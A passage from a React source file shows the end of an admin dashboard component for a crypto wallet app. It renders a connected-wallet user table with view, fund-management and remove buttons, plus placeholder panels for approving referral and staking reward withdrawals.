                                            {new Date(walletUser.lastSeen).toLocaleDateString()} <span className="text-[9px]">{new Date(walletUser.lastSeen).toLocaleTimeString()}</span>
                                        </td>
                                        <td className="py-4 text-xs text-primary font-black">
                                            {walletUser.connectionCount}
                                        </td>
                                        <td className="py-4 text-right">
                                            <div className="flex items-center justify-end gap-2">
                                                <button
                                                    onClick={() => {
                                                        setTargetUser(walletUser.walletAddress);
                                                        handleFetchUser(walletUser.walletAddress);
                                                        window.scrollTo({ top: 0, behavior: 'smooth' });
                                                    }}
                                                    className="bg-white/5 hover:bg-white/10 text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="View User Details"
                                                >
                                                    <span className="material-icons-round text-sm">visibility</span>
                                                </button>
                                                <button
                                                    onClick={() => {
                                                        setMfFrom(walletUser.walletAddress);
                                                        window.scrollTo({ top: 600, behavior: 'smooth' });
                                                    }}
                                                    className="bg-accent-cyan/10 hover:bg-accent-cyan text-accent-cyan hover:text-black p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="Manage Funds"
                                                >
                                                    <span className="material-icons-round text-sm">settings_suggest</span>
                                                </button>
                                                <button
                                                    onClick={() => {
                                                        if (window.confirm(`Remove wallet connection for ${walletUser.walletAddress}?`)) {
                                                            walletConnectionsManager.removeConnection(walletUser.walletAddress);
                                                            setWalletUsers(walletConnectionsManager.getConnections());
                                                        }
                                                    }}
                                                    className="bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                    title="Remove Connection"
                                                >
                                                    <span className="material-icons-round text-sm">delete</span>
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>

                {/* WITHDRAWAL MANAGEMENT */}
                <div className="bg-card-dark rounded-3xl p-6 border border-purple-500/20 shadow-card">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-lg font-black text-white flex items-center gap-2">
                            <span className="material-icons-round text-purple-400 text-xl">account_balance</span> Withdrawal Management
                        </h2>
                        <div className="flex items-center gap-3">
                            <span className="text-[11px] font-black text-gray-400 uppercase tracking-widest">
                                Pending: 0
                            </span>
                            <button
                                onClick={() => {}}
                                className="bg-purple-500/10 text-purple-400 border border-purple-500/20 hover:bg-purple-500 hover:text-black px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none"
                            >
                                Refresh
                            </button>
                        </div>
                    </div>

                    <div className="space-y-4">
                        <div className="bg-gradient-to-r from-purple-500/10 to-blue-500/10 rounded-2xl p-4 border border-purple-500/20">
                            <div className="flex items-center justify-between mb-3">
                                <div>
                                    <p className="text-sm font-black text-white">Referral Reward Claims</p>
                                    <p className="text-xs text-gray-400">Users requesting network commission withdrawals</p>
                                </div>
                                <span className="bg-purple-500/20 text-purple-400 text-xs px-3 py-1 rounded-full font-black uppercase">0 Pending</span>
                            </div>
                            <div className="text-center py-8">
                                <span className="material-icons-round text-4xl text-gray-600 mb-2 block">pending</span>
                                <p className="text-gray-500 text-sm font-medium">No pending referral withdrawal requests</p>
                                <p className="text-gray-600 text-xs mt-1">Users will submit requests through the app</p>
                            </div>
                        </div>

                        <div className="bg-gradient-to-r from-blue-500/10 to-cyan-500/10 rounded-2xl p-4 border border-blue-500/20">
                            <div className="flex items-center justify-between mb-3">
                                <div>
                                    <p className="text-sm font-black text-white">Staking Reward Claims</p>
                                    <p className="text-xs text-gray-400">Users requesting mining reward withdrawals</p>
                                </div>
                                <span className="bg-blue-500/20 text-blue-400 text-xs px-3 py-1 rounded-full font-black uppercase">0 Pending</span>
                            </div>
                            <div className="text-center py-8">
                                <span className="material-icons-round text-4xl text-gray-600 mb-2 block">savings</span>
                                <p className="text-gray-500 text-sm font-medium">No pending staking reward requests</p>
                                <p className="text-gray-600 text-xs mt-1">Reward claims will appear here for approval</p>
                            </div>
                        </div>

                        <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-2xl p-4">
                            <div className="flex items-center gap-3 mb-3">
                                <span className="material-icons-round text-yellow-500">info</span>
                                <div>
                                    <p className="text-sm font-black text-yellow-500">Withdrawal Process</p>
                                    <p className="text-xs text-gray-400">How admin approvals work</p>
                                </div>
                            </div>
                            <div className="space-y-2 text-xs text-gray-300">
                                <p><strong className="text-yellow-400">Step 1:</strong> User submits withdrawal request in app</p>
                                <p><strong className="text-yellow-400">Step 2:</strong> Admin reviews and approves request</p>
                                <p><strong className="text-yellow-400">Step 3:</strong> Admin processes approved withdrawal</p>
                                <p><strong className="text-yellow-400">Step 4:</strong> Funds are transferred to user wallet</p>
                            </div>
                        </div>
                    </div>
                </div>

            </main>
        </div>
    );
};

export default AdminControl;
